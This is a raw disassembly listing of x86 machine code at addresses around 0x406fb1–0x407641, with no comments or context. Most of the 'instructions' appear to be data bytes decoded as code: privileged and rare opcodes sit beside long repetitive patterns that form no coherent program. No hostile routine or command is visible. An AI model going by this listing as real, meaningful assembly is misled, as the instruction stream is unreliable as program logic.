  406fb1:	05 89 02 9b 18       	add    $0x189b0289,%eax
  406fb6:	6b 01 89             	imul   $0xffffff89,(%ecx),%eax
  406fb9:	02 d0                	add    %al,%dl
  406fbb:	06                   	push   %es
  406fbc:	20 05 89 02 2a 1c    	and    %al,0x1c2a0289
  406fc2:	4b                   	dec    %ebx
  406fc3:	02 81 02 a9 1b 27    	add    0x271ba902(%ecx),%al
  406fc9:	05 c1 02 74 14       	add    $0x147402c1,%eax
  406fce:	30 05 c9 02 83 08    	xor    %al,0x88302c9
  406fd4:	c7 00 91 02 d1 1c    	movl   $0x1cd10291,(%eax)
  406fda:	35 05 c1 01 d3       	xor    $0xd301c105,%eax
  406fdf:	18 3f                	sbb    %bh,(%edi)
  406fe1:	05 91 02 c9 0a       	add    $0xac90291,%eax
  406fe6:	46                   	inc    %esi
  406fe7:	05 d9 02 bc 18       	add    $0x18bc02d9,%eax
  406fec:	84 00                	test   %al,(%eax)
  406fee:	d9 02                	flds   (%edx)
  406ff0:	e3 08                	jecxz  0x406ffa
  406ff2:	3e 01 e1             	ds add %esp,%ecx
  406ff5:	02 17                	add    (%edi),%dl
  406ff7:	15 4c 05 d9 02       	adc    $0x2d9054c,%eax
  406ffc:	7e 16                	jle    0x407014
  406ffe:	2a 01                	sub    (%ecx),%al
  407000:	a1 02 16 07 c3       	mov    0xc3071602,%eax
  407005:	00 c1                	add    %al,%cl
  407007:	01 d3                	add    %edx,%ebx
  407009:	18 01                	sbb    %al,(%ecx)
  40700b:	05 99 02 17 15       	add    $0x15170299,%eax
  407010:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  407013:	02 e3                	add    %bl,%ah
  407015:	07                   	pop    %es
  407016:	6b 01 a1             	imul   $0xffffffa1,(%ecx),%eax
  407019:	02 71 0d             	add    0xd(%ecx),%dh
  40701c:	c3                   	ret
  40701d:	00 a1 02 26 07 c7    	add    %ah,-0x38f8d9fe(%ecx)
  407023:	00 89 02 1b 0d 4b    	add    %cl,0x4b0d1b02(%ecx)
  407029:	02 89 02 82 0a 4b    	add    0x4b0a8202(%ecx),%cl
  40702f:	02 59 01             	add    0x1(%ecx),%bl
  407032:	b7 1b                	mov    $0x1b,%bh
  407034:	3e 01 59 01          	add    %ebx,%ds:0x1(%ecx)
  407038:	61                   	popa
  407039:	1d c3 00 a1 02       	sbb    $0x2a100c3,%eax
  40703e:	7a 1b                	jp     0x40705b
  407040:	c7 00 f9 02 17 15    	movl   $0x151702f9,(%eax)
  407046:	6b 01 f9             	imul   $0xfffffff9,(%ecx),%eax
  407049:	02 1e                	add    (%esi),%bl
  40704b:	0b 23                	or     (%ebx),%esp
  40704d:	02 01                	add    (%ecx),%al
  40704f:	03 17                	add    (%edi),%edx
  407051:	15 0e 00 01 03       	adc    $0x301000e,%eax
  407056:	58                   	pop    %eax
  407057:	07                   	pop    %es
  407058:	47                   	inc    %edi
  407059:	02 c1                	add    %cl,%al
  40705b:	01 ab 14 47 02 c1    	add    %ebp,-0x3efdb8ec(%ebx)
  407061:	01 d5                	add    %edx,%ebp
  407063:	17                   	pop    %ss
  407064:	42                   	inc    %edx
  407065:	02 09                	add    (%ecx),%cl
  407067:	03 17                	add    (%edi),%edx
  407069:	15 6b 01 09 03       	adc    $0x309016b,%eax
  40706e:	70 19                	jo     0x407089
  407070:	6a 05                	push   $0x5
  407072:	11 03                	adc    %eax,(%ebx)
  407074:	ff 14 70             	call   *(%eax,%esi,2)
  407077:	05 19 03 00 1b       	add    $0x1b000319,%eax
  40707c:	76 05                	jbe    0x407083
  40707e:	21 03                	and    %eax,(%ebx)
  407080:	e7 0f                	out    %eax,$0xf
  407082:	7c 05                	jl     0x407089
  407084:	c1 01 1c             	roll   $0x1c,(%ecx)
  407087:	1a 47 02             	sbb    0x2(%edi),%al
  40708a:	19 03                	sbb    %eax,(%ebx)
  40708c:	ec                   	in     (%dx),%al
  40708d:	1b bf 01 81 02 d9    	sbb    -0x26fd7eff(%edi),%edi
  407093:	05 86 05 29 03       	add    $0x3290586,%eax
  407098:	6e                   	outsb  %ds:(%esi),(%dx)
  407099:	00 f4                	add    %dh,%ah
  40709b:	01 59 01             	add    %ebx,0x1(%ecx)
  40709e:	61                   	popa
  40709f:	1b 7b 00             	sbb    0x0(%ebx),%edi
  4070a2:	59                   	pop    %ecx
  4070a3:	01 86 07 c3 00 59    	add    %eax,0x5900c307(%esi)
  4070a9:	01 48 07             	add    %ecx,0x7(%eax)
  4070ac:	c3                   	ret
  4070ad:	00 59 01             	add    %bl,0x1(%ecx)
  4070b0:	16                   	push   %ss
  4070b1:	11 93 05 c1 01 d3    	adc    %edx,-0x2cfe3efb(%ebx)
  4070b7:	18 99 05 49 03 17    	sbb    %bl,0x17034905(%ecx)
  4070bd:	15 0e 00 61 01       	adc    $0x161000e,%eax
  4070c2:	52                   	push   %edx
  4070c3:	02 cd                	add    %ch,%cl
  4070c5:	03 51 03             	add    0x3(%ecx),%edx
  4070c8:	2f                   	das
  4070c9:	0d 75 01 69 00       	or     $0x690175,%eax
  4070ce:	17                   	pop    %ss
  4070cf:	15 0e 00 21 02       	adc    $0x221000e,%eax
  4070d4:	7c 0c                	jl     0x4070e2
  4070d6:	70 01                	jo     0x4070d9
  4070d8:	69 00 da 04 aa 05    	imul   $0x5aa04da,(%eax),%eax
  4070de:	c1 01 e0             	roll   $0xe0,(%ecx)
  4070e1:	0c b0                	or     $0xb0,%al
  4070e3:	05 c1 01 59 14       	add    $0x145901c1,%eax
  4070e8:	47                   	inc    %edi
  4070e9:	02 c1                	add    %cl,%al
  4070eb:	01 f3                	add    %esi,%ebx
  4070ed:	04 bd                	add    $0xbd,%al
  4070ef:	05 59 01 f0 0f       	add    $0xff00159,%eax
  4070f4:	1d 00 61 03 7c       	sbb    $0x7c036100,%eax
  4070f9:	0c 47                	or     $0x47,%al
  4070fb:	02 69 03             	add    0x3(%ecx),%ch
  4070fe:	5e                   	pop    %esi
  4070ff:	0d c3 00 b1 02       	or     $0x2b100c3,%eax
  407104:	c1 07 c3             	roll   $0xc3,(%edi)
  407107:	05 59 03 d3 07       	add    $0x7d30359,%eax
  40710c:	c3                   	ret
  40710d:	05 59 03 7c 0c       	add    $0xc7c0359,%eax
  407112:	47                   	inc    %edi
  407113:	02 71 03             	add    0x3(%ecx),%dh
  407116:	0c 1b                	or     $0x1b,%al
  407118:	c9                   	leave
  407119:	05 79 03 17 15       	add    $0x15170379,%eax
  40711e:	cf                   	iret
  40711f:	05 79 03 82 06       	add    $0x6820379,%eax
  407124:	d6                   	salc
  407125:	05 c1 00 6f 08       	add    $0x86f00c1,%eax
  40712a:	0e                   	push   %cs
  40712b:	00 19                	add    %bl,(%ecx)
  40712d:	00 6f 08             	add    %ch,0x8(%edi)
  407130:	0e                   	push   %cs
  407131:	00 09                	add    %cl,(%ecx)
  407133:	03 17                	add    (%edi),%edx
  407135:	15 36 02 0c 00       	adc    $0xc0236,%eax
  40713a:	17                   	pop    %ss
  40713b:	15 0e 00 0c 00       	adc    $0xc000e,%eax
  407140:	33 03                	xor    (%ebx),%eax
  407142:	f5                   	cmc
  407143:	05 0c 00 57 1b       	add    $0x1b57000c,%eax
  407148:	f4                   	hlt
  407149:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  40714c:	88 1c fb             	mov    %bl,(%ebx,%edi,8)
  40714f:	05 c1 01 f5 10       	add    $0x10f501c1,%eax
  407154:	01 06                	add    %eax,(%esi)
  407156:	51                   	push   %ecx
  407157:	00 04 18             	add    %al,(%eax,%ebx,1)
  40715a:	11 06                	adc    %eax,(%esi)
  40715c:	51                   	push   %ecx
  40715d:	00 f4                	add    %dh,%ah
  40715f:	01 17                	add    %edx,(%edi)
  407161:	06                   	push   %es
  407162:	59                   	pop    %ecx
  407163:	00 7c 03 17          	add    %bh,0x17(%ebx,%eax,1)
  407167:	06                   	push   %es
  407168:	89 03                	mov    %eax,(%ebx)
  40716a:	81 1d 1d 06 69 00 17 	sbbl   $0x3011517,0x69061d
  407171:	15 01 03 
  407174:	61                   	popa
  407175:	00 17                	add    %dl,(%edi)
  407177:	15 2d 06 91 03       	adc    $0x391062d,%eax
  40717c:	6f                   	outsl  %ds:(%esi),(%dx)
  40717d:	08 0e                	or     %cl,(%esi)
  40717f:	00 99 03 17 15 56    	add    %bl,0x56151703(%ecx)
  407185:	04 a1                	add    $0xa1,%al
  407187:	03 cb                	add    %ebx,%ecx
  407189:	0b 35 06 81 02 28    	or     0x28028106,%esi
  40718f:	05 0a 00 91 02       	add    $0x291000a,%eax
  407194:	b7 1c                	mov    $0x1c,%bh
  407196:	35 05 91 02 c9       	xor    $0xc9029105,%eax
  40719b:	0a 43 06             	or     0x6(%ebx),%al
  40719e:	89 01                	mov    %eax,(%ecx)
  4071a0:	8a 05 47 02 91 02    	mov    0x2910247,%al
  4071a6:	b7 1c                	mov    $0x1c,%bh
  4071a8:	54                   	push   %esp
  4071a9:	06                   	push   %es
  4071aa:	91                   	xchg   %eax,%ecx
  4071ab:	02 c0                	add    %al,%al
  4071ad:	0a 7c 05 91          	or     -0x6f(%ebp,%eax,1),%bh
  4071b1:	02 a9 0a 6b 01 91    	add    -0x6efe94f6(%ecx),%ch
  4071b7:	02 d1                	add    %cl,%dl
  4071b9:	1c 5e                	sbb    $0x5e,%al
  4071bb:	06                   	push   %es
  4071bc:	91                   	xchg   %eax,%ecx
  4071bd:	02 79 05             	add    0x5(%ecx),%bh
  4071c0:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071c3:	00 33                	add    %dh,(%ebx)
  4071c5:	03 f5                	add    %ebp,%esi
  4071c7:	05 b9 03 c0 1b       	add    $0x1bc003b9,%eax
  4071cc:	7c 06                	jl     0x4071d4
  4071ce:	1c 00                	sbb    $0x0,%al
  4071d0:	ff 14 92             	call   *(%edx,%edx,4)
  4071d3:	06                   	push   %es
  4071d4:	24 00                	and    $0x0,%al
  4071d6:	00 1b                	add    %bl,(%ebx)
  4071d8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4071d9:	06                   	push   %es
  4071da:	1c 00                	sbb    $0x0,%al
  4071dc:	f4                   	hlt
  4071dd:	0a a9 06 24 00 ec    	or     -0x13ffdbfa(%ecx),%ch
  4071e3:	1b bf 01 c9 03 d2    	sbb    -0x2dfc36ff(%edi),%edi
  4071e9:	10 b3 06 c9 03 29    	adc    %dh,0x2903c906(%ebx)
  4071ef:	03 b9 06 d1 03 36    	add    0x3603d106(%ecx),%edi
  4071f5:	08 c1                	or     %al,%cl
  4071f7:	06                   	push   %es
  4071f8:	e1 03                	loope  0x4071fd
  4071fa:	fb                   	sti
  4071fb:	04 c8                	add    $0xc8,%al
  4071fd:	06                   	push   %es
  4071fe:	d9 03                	flds   (%ebx)
  407200:	19 06                	sbb    %eax,(%esi)
  407202:	cf                   	iret
  407203:	06                   	push   %es
  407204:	f1                   	int1
  407205:	03 c4                	add    %esp,%eax
  407207:	08 d8                	or     %bl,%al
  407209:	06                   	push   %es
  40720a:	01 04 e7             	add    %eax,(%edi,%eiz,8)
  40720d:	12 e2                	adc    %dl,%ah
  40720f:	06                   	push   %es
  407210:	2c 00                	sub    $0x0,%al
  407212:	c4 08                	les    (%eax),%ecx
  407214:	17                   	pop    %ss
  407215:	07                   	pop    %es
  407216:	2c 00                	sub    $0x0,%al
  407218:	83 19 23             	sbbl   $0x23,(%ecx)
  40721b:	07                   	pop    %es
  40721c:	34 00                	xor    $0x0,%al
  40721e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40721f:	05 3b 07 1c 00       	add    $0x1c073b,%eax
  407224:	17                   	pop    %ss
  407225:	15 0e 00 c1 01       	adc    $0x1c1000e,%eax
  40722a:	bf 1d 84 00 21       	mov    $0x2100841d,%edi
  40722f:	04 17                	add    $0x17,%al
  407231:	15 6b 01 19 04       	adc    $0x419016b,%eax
  407236:	17                   	pop    %ss
  407237:	15 59 07 29 04       	adc    $0x4290759,%eax
  40723c:	cb                   	lret
  40723d:	16                   	push   %ss
  40723e:	61                   	popa
  40723f:	07                   	pop    %es
  407240:	51                   	push   %ecx
  407241:	01 47 0c             	add    %eax,0xc(%edi)
  407244:	93                   	xchg   %eax,%ebx
  407245:	01 49 04             	add    %ecx,0x4(%ecx)
  407248:	17                   	pop    %ss
  407249:	15 6b 01 59 02       	adc    $0x259016b,%eax
  40724e:	17                   	pop    %ss
  40724f:	15 0e 00 31 04       	adc    $0x431000e,%eax
  407254:	17                   	pop    %ss
  407255:	15 0e 00 51 04       	adc    $0x451000e,%eax
  40725a:	73 0b                	jae    0x407267
  40725c:	01 03                	add    %eax,(%ebx)
  40725e:	51                   	push   %ecx
  40725f:	04 10                	add    $0x10,%al
  407261:	0b 01                	or     (%ecx),%eax
  407263:	03 51 04             	add    0x4(%ecx),%edx
  407266:	0a 05 7a 07 51 04    	or     0x451077a,%al
  40726c:	bf 0b 81 07 51       	mov    $0x5107810b,%edi
  407271:	04 af                	add    $0xaf,%al
  407273:	1c 2b                	sbb    $0x2b,%al
  407275:	02 51 04             	add    0x4(%ecx),%dl
  407278:	8c 02                	mov    %es,(%edx)
  40727a:	0e                   	push   %cs
  40727b:	00 51 04             	add    %dl,0x4(%ecx)
  40727e:	3c 15                	cmp    $0x15,%al
  407280:	88 07                	mov    %al,(%edi)
  407282:	39 04 17             	cmp    %eax,(%edi,%edx,1)
  407285:	15 8e 07 51 04       	adc    $0x451078e,%eax
  40728a:	7e 02                	jle    0x40728e
  40728c:	31 02                	xor    %eax,(%edx)
  40728e:	39 04 62             	cmp    %eax,(%edx,%eiz,2)
  407291:	0e                   	push   %cs
  407292:	0e                   	push   %cs
  407293:	00 41 04             	add    %al,0x4(%ecx)
  407296:	17                   	pop    %ss
  407297:	15 2b 02 59 02       	adc    $0x259022b,%eax
  40729c:	88 1c 31             	mov    %bl,(%ecx,%esi,1)
  40729f:	02 51 03             	add    0x3(%ecx),%dl
  4072a2:	2f                   	das
  4072a3:	0d 9a 07 79 04       	or     $0x479079a,%eax
  4072a8:	17                   	pop    %ss
  4072a9:	15 6b 01 51 04       	adc    $0x451016b,%eax
  4072ae:	85 02                	test   %eax,(%edx)
  4072b0:	2b 02                	sub    (%edx),%eax
  4072b2:	51                   	push   %ecx
  4072b3:	04 2c                	add    $0x2c,%al
  4072b5:	15 88 07 c1 00       	adc    $0xc10788,%eax
  4072ba:	93                   	xchg   %eax,%ebx
  4072bb:	0d 23 02 81 04       	or     $0x4810223,%eax
  4072c0:	42                   	inc    %edx
  4072c1:	1d be 07 91 04       	sbb    $0x49107be,%eax
  4072c6:	6b 1c d0 07          	imul   $0x7,(%eax,%edx,8),%ebx
  4072ca:	a1 04 17 15 0e       	mov    0xe151704,%eax
  4072cf:	00 c1                	add    %al,%cl
  4072d1:	01 df                	add    %ebx,%edi
  4072d3:	18 f9                	sbb    %bh,%cl
  4072d5:	07                   	pop    %es
  4072d6:	49                   	dec    %ecx
  4072d7:	02 cb                	add    %bl,%cl
  4072d9:	16                   	push   %ss
  4072da:	99                   	cltd
  4072db:	01 49 02             	add    %ecx,0x2(%ecx)
  4072de:	cb                   	lret
  4072df:	16                   	push   %ss
  4072e0:	ab                   	stos   %eax,%es:(%edi)
  4072e1:	01 a9 00 17 15 0e    	add    %ebp,0xe151700(%ecx)
  4072e7:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4072ea:	e7 0f                	out    %eax,$0xf
  4072ec:	06                   	push   %es
  4072ed:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072f0:	57                   	push   %edi
  4072f1:	1b f4                	sbb    %esp,%esi
  4072f3:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072f6:	dc 12                	fcoml  (%edx)
  4072f8:	0e                   	push   %cs
  4072f9:	00 c1                	add    %al,%cl
  4072fb:	01 88 17 42 02 c1    	add    %ecx,-0x3efdbde9(%eax)
  407301:	00 9f 0a 28 08 49    	add    %bl,0x4908280a(%edi)
  407307:	02 cb                	add    %bl,%cl
  407309:	16                   	push   %ss
  40730a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40730b:	01 51 01             	add    %edx,0x1(%ecx)
  40730e:	ad                   	lods   %ds:(%esi),%eax
  40730f:	00 32                	add    %dh,(%edx)
  407311:	08 c1                	or     %al,%cl
  407313:	01 51 10             	add    %edx,0x10(%ecx)
  407316:	47                   	inc    %edi
  407317:	02 a9 04 7d 08 37    	add    0x37087d04(%ecx),%ch
  40731d:	08 51 01             	or     %dl,0x1(%ecx)
  407320:	ad                   	lods   %ds:(%esi),%eax
  407321:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  407324:	51                   	push   %ecx
  407325:	01 ad 00 41 08 51    	add    %ebp,0x51084100(%ebp)
  40732b:	01 ad 00 46 08 51    	add    %ebp,0x51084600(%ebp)
  407331:	01 ce                	add    %ecx,%esi
  407333:	00 4d 08             	add    %cl,0x8(%ebp)
  407336:	41                   	inc    %ecx
  407337:	03 7d 08             	add    0x8(%ebp),%edi
  40733a:	52                   	push   %edx
  40733b:	08 51 01             	or     %dl,0x1(%ecx)
  40733e:	ce                   	into
  40733f:	00 57 08             	add    %dl,0x8(%edi)
  407342:	51                   	push   %ecx
  407343:	01 ce                	add    %ecx,%esi
  407345:	00 5c 08 51          	add    %bl,0x51(%eax,%ecx,1)
  407349:	01 ce                	add    %ecx,%esi
  40734b:	00 61 08             	add    %ah,0x8(%ecx)
  40734e:	51                   	push   %ecx
  40734f:	01 c5                	add    %eax,%ebp
  407351:	05 68 08 b1 04       	add    $0x4b10868,%eax
  407356:	7d 08                	jge    0x407360
  407358:	6d                   	insl   (%dx),%es:(%edi)
  407359:	08 49 02             	or     %cl,0x2(%ecx)
  40735c:	cb                   	lret
  40735d:	16                   	push   %ss
  40735e:	7a 08                	jp     0x407368
  407360:	59                   	pop    %ecx
  407361:	03 58 1d             	add    0x1d(%eax),%ebx
  407364:	23 02                	and    (%edx),%eax
  407366:	e1 02                	loope  0x40736a
  407368:	17                   	pop    %ss
  407369:	15 88 08 c1 00       	adc    $0xc10888,%eax
  40736e:	96                   	xchg   %eax,%esi
  40736f:	0a f4                	or     %ah,%dh
  407371:	01 89 01 17 15 6b    	add    %ecx,0x6b151701(%ecx)
  407377:	01 49 02             	add    %ecx,0x2(%ecx)
  40737a:	e0 00                	loopne 0x40737c
  40737c:	b6 08                	mov    $0x8,%dh
  40737e:	49                   	dec    %ecx
  40737f:	02 42 06             	add    0x6(%edx),%al
  407382:	bd 08 49 02 c5       	mov    $0xc5024908,%ebp
  407387:	05 c4 08 49 02       	add    $0x24908c4,%eax
  40738c:	65 00 cb             	gs add %cl,%bl
  40738f:	08 49 02             	or     %cl,0x2(%ecx)
  407392:	ad                   	lods   %ds:(%esi),%eax
  407393:	00 d2                	add    %dl,%dl
  407395:	08 49 02             	or     %cl,0x2(%ecx)
  407398:	e9 00 d9 08 49       	jmp    0x49494c9d
  40739d:	02 ce                	add    %dh,%cl
  40739f:	00 e0                	add    %ah,%al
  4073a1:	08 49 02             	or     %cl,0x2(%ecx)
  4073a4:	cb                   	lret
  4073a5:	16                   	push   %ss
  4073a6:	12 09                	adc    (%ecx),%cl
  4073a8:	d1 04 17             	roll   $1,(%edi,%edx,1)
  4073ab:	15 28 09 09 00       	adc    $0x90928,%eax
  4073b0:	80 00 0d             	addb   $0xd,(%eax)
  4073b3:	01 09                	add    %ecx,(%ecx)
  4073b5:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073bc:	88 00                	mov    %al,(%eax)
  4073be:	17                   	pop    %ss
  4073bf:	01 08                	add    %ecx,(%eax)
  4073c1:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073c7:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073ce:	a0 00 66 01 08       	mov    0x8016600,%al
  4073d3:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073da:	ec                   	in     (%dx),%al
  4073db:	00 7f 02             	add    %bh,0x2(%edi)
  4073de:	08 00                	or     %al,(%eax)
  4073e0:	f0 00 17             	lock add %dl,(%edi)
  4073e3:	01 08                	add    %ecx,(%eax)
  4073e5:	00 f4                	add    %dh,%ah
  4073e7:	00 12                	add    %dl,(%edx)
  4073e9:	01 08                	add    %ecx,(%eax)
  4073eb:	00 f8                	add    %bh,%al
  4073ed:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073f4:	89 02                	mov    %eax,(%edx)
  4073f6:	08 00                	or     %al,(%eax)
  4073f8:	00 01                	add    %al,(%ecx)
  4073fa:	8e 02                	mov    (%edx),%es
  4073fc:	08 00                	or     %al,(%eax)
  4073fe:	04 01                	add    $0x1,%al
  407400:	93                   	xchg   %eax,%ebx
  407401:	02 08                	add    (%eax),%cl
  407403:	00 08                	add    %cl,(%eax)
  407405:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  40740b:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407411:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  407417:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  40741d:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  407424:	06                   	push   %es
  407425:	03 2e                	add    (%esi),%ebp
  407427:	00 33                	add    %dh,(%ebx)
  407429:	00 0f                	add    %cl,(%edi)
  40742b:	03 2e                	add    (%esi),%ebp
  40742d:	00 3b                	add    %bh,(%ebx)
  40742f:	00 34 03             	add    %dh,(%ebx,%eax,1)
  407432:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  407436:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  40743b:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407441:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  407447:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  40744d:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  407453:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407459:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  40745f:	00 43 03             	add    %al,0x3(%ebx)
  407462:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407469:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  40746f:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  407475:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  40747b:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407481:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  407487:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  40748d:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  407493:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407499:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  40749f:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  4074a5:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074ab:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074b1:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074b7:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074bd:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074c3:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c9:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074cf:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074d5:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074db:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074e1:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074e7:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074ed:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074f3:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f9:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074ff:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  407505:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  40750b:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407511:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  407517:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  40751d:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  407523:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407529:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  40752f:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  407535:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  40753b:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407541:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407547:	00 20                	add    %ah,(%eax)
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40754e:	01 00                	add    %eax,(%eax)
  407550:	06                   	push   %es
  407551:	00 00                	add    %al,(%eax)
  407553:	00 1e                	add    %bl,(%esi)
  407555:	00 c0                	add    %al,%al
  407557:	03 c9                	add    %ecx,%ecx
  407559:	03 f4                	add    %esp,%esi
  40755b:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  407562:	54                   	push   %esp
  407563:	05 59 05 81 05       	add    $0x5810559,%eax
  407568:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  40756e:	b6 05                	mov    $0x5,%dh
  407570:	dd 05 08 06 27 06    	fldl   0x6270608
  407576:	3c 06                	cmp    $0x6,%al
  407578:	4c                   	dec    %esp
  407579:	06                   	push   %es
  40757a:	66 06                	pushw  %es
  40757c:	af                   	scas   %es:(%edi),%eax
  40757d:	06                   	push   %es
  40757e:	53                   	push   %ebx
  40757f:	07                   	pop    %es
  407580:	67 07                	addr16 pop %es
  407582:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  407587:	07                   	pop    %es
  407588:	e8 07 f0 07 ff       	call   0xff486594
  40758d:	07                   	pop    %es
  40758e:	0c 08                	or     $0x8,%al
  407590:	11 08                	adc    %ecx,(%eax)
  407592:	20 08                	and    %cl,(%eax)
  407594:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407599:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  40759f:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  4075a5:	08 f7                	or     %dh,%bh
  4075a7:	08 fc                	or     %bh,%ah
  4075a9:	08 02                	or     %al,(%edx)
  4075ab:	09 0b                	or     %ecx,(%ebx)
  4075ad:	09 18                	or     %ebx,(%eax)
  4075af:	09 31                	or     %esi,(%ecx)
  4075b1:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075b4:	01 00                	add    %eax,(%eax)
  4075b6:	16                   	push   %ss
  4075b7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075ba:	17                   	pop    %ss
  4075bb:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075c1:	00 00                	add    %al,(%eax)
  4075c3:	00 76 1a             	add    %dh,0x1a(%esi)
  4075c6:	9f                   	lahf
  4075c7:	00 00                	add    %al,(%eax)
  4075c9:	00 5a 1a             	add    %bl,0x1a(%edx)
  4075cc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4075cd:	00 00                	add    %al,(%eax)
  4075cf:	00 b3 13 a9 00 00    	add    %dh,0xa913(%ebx)
  4075d5:	00 3f                	add    %bh,(%edi)
  4075d7:	0b ae 00 00 00 f0    	or     -0x10000000(%esi),%ebp
  4075dd:	19 ae 00 00 00 ea    	sbb    %ebp,-0x16000000(%esi)
  4075e3:	0a b2 00 00 00 67    	or     0x67000000(%edx),%dh
  4075e9:	03 b7 00 00 00 07    	add    0x7000000(%edi),%esi
  4075ef:	03 bb 00 00 00 a9    	add    -0x57000000(%ebx),%edi
  4075f5:	0b b2 00 00 00 13    	or     0x13000000(%edx),%esi
  4075fb:	0f bf 00             	movswl (%eax),%eax
  4075fe:	00 00                	add    %al,(%eax)
  407600:	0e                   	push   %cs
  407601:	0d b7 00 00 00       	or     $0xb7,%eax
  407606:	ba 1a c3 01 00       	mov    $0x1c31a,%edx
  40760b:	00 eb                	add    %ch,%bl
  40760d:	0f f8 01             	psubb  (%ecx),%mm0
  407610:	00 00                	add    %al,(%eax)
  407612:	ae                   	scas   %es:(%edi),%al
  407613:	0d fe 01 00 00       	or     $0x1fe,%eax
  407618:	bc 0c 69 02 00       	mov    $0x2690c,%esp
  40761d:	00 f3                	add    %dh,%bl
  40761f:	13 6d 02             	adc    0x2(%ebp),%ebp
  407622:	00 00                	add    %al,(%eax)
  407624:	1e                   	push   %ds
  407625:	19 71 02             	sbb    %esi,0x2(%ecx)
  407628:	00 00                	add    %al,(%eax)
  40762a:	9f                   	lahf
  40762b:	1c 75                	sbb    $0x75,%al
  40762d:	02 00                	add    (%eax),%al
  40762f:	00 09                	add    %cl,(%ecx)
  407631:	08 7a 02             	or     %bh,0x2(%edx)
  407634:	02 00                	add    (%eax),%al
  407636:	06                   	push   %es
  407637:	00 03                	add    %al,(%ebx)
  407639:	00 01                	add    %al,(%ecx)
  40763b:	00 07                	add    %al,(%edi)
  40763d:	00 03                	add    %al,(%ebx)
  40763f:	00 02                	add    %al,(%edx)
  407641:	00 08                	add    %cl,(%eax)
